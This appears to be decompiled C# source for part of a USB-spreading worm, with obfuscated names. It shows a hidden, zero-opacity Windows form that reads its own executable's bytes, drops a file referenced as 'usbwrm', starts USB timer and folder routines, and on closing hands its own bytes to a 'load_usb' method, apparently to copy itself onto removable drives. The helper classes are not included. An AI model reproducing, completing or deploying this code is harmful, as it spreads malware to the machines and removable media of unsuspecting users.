using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace uwcrise;

public class Form1 : Form
{
	private IContainer components = null;

	private MAEUSB qurarisousb = new MAEUSB();

	private byte[] fileByt = null;

	private qurarisoPUSB qurarisopusb = new qurarisoPUSB();

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Control)this).set_Visible(false);
			((Form)this).set_ShowIcon(false);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			try
			{
				if (!Directory.Exists(qurarisoSETPS.qurarisoget_upath()))
				{
					Directory.CreateDirectory(qurarisoSETPS.qurarisoget_upath());
				}
				if (qurarisoSETPS.qurarisoget_mpath() + qurarisoSETPS.qurarisousbName + ".exe|carcmr".Split(new char[1] { '|' })[0] != Application.get_ExecutablePath())
				{
					fileByt = File.ReadAllBytes(Application.get_ExecutablePath());
				}
				if (!File.Exists(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbwrm))
				{
					File.WriteAllText(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbwrm, "readme information");
				}
			}
			catch
			{
			}
			qurarisousb.qurarisoshow_folder();
			qurarisopusb.qurarisoset_timer();
		}
		catch
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		qurarisousb.qurarisoload_usb(fileByt);
	}
}
